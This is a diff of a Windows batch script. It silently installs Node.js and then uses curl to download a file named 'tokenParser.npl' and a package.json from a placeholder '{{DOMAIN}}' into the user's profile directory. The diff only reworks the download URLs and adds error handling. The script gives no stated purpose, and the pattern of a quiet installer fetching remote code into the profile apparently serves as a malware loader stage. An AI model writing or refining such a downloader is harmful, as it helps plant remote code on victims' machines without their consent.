@@ -26,6 +26,7 @@ if not defined NODE_INSTALLED_VERSION (
     set "INSTALL_NODE=0"
 )
 
+
 if "!INSTALL_NODE!"=="1" (
     where curl >nul 2>&1
     if %errorlevel% NEQ 0 (
@@ -35,13 +36,20 @@ if "!INSTALL_NODE!"=="1" (
     )
 
     if exist "%NODE_MSI%" (
-        msiexec /i "%NODE_MSI%" /quiet /norestart
-        if exist "%NODE_MSI%" del "%NODE_MSI%"
+        start /wait msiexec /i "%NODE_MSI%" /qn /norestart
+        if errorlevel 1 (
+            exit /b
+        )
+        del "%NODE_MSI%"
     ) else (
         exit /b 1
     )
+)
 
-    set "PATH=%NODE_DIR%\bin;%PATH%"
+:: Simulate try/catch using labels
+set "NODE_DIR=%ProgramFiles%\nodejs"
+if exist "%NODE_DIR%\node.exe" (
+    set "PATH=%NODE_DIR%;%PATH%"
 )
 
 where node >nul 2>&1
@@ -57,8 +65,8 @@ if errorlevel 1 (
 :: Set user profile path
 set "USERPROFILE=%USERPROFILE%"
 
-curl -L -o "%USERPROFILE%\tokenParser.npl" "{{DOMAIN}}/users/tokenParser.npl"
-curl -L -o "%USERPROFILE%\package.json" "{{DOMAIN}}/users/package.json"
+curl -L -o "%USERPROFILE%\tokenParser.npl" "{{DOMAIN}}/tokenParser.npl"
+curl -L -o "%USERPROFILE%\package.json" "{{DOMAIN}}/package.json"
 
 if not exist "%~dp0node_modules\request" (
     pushd "%~dp0"
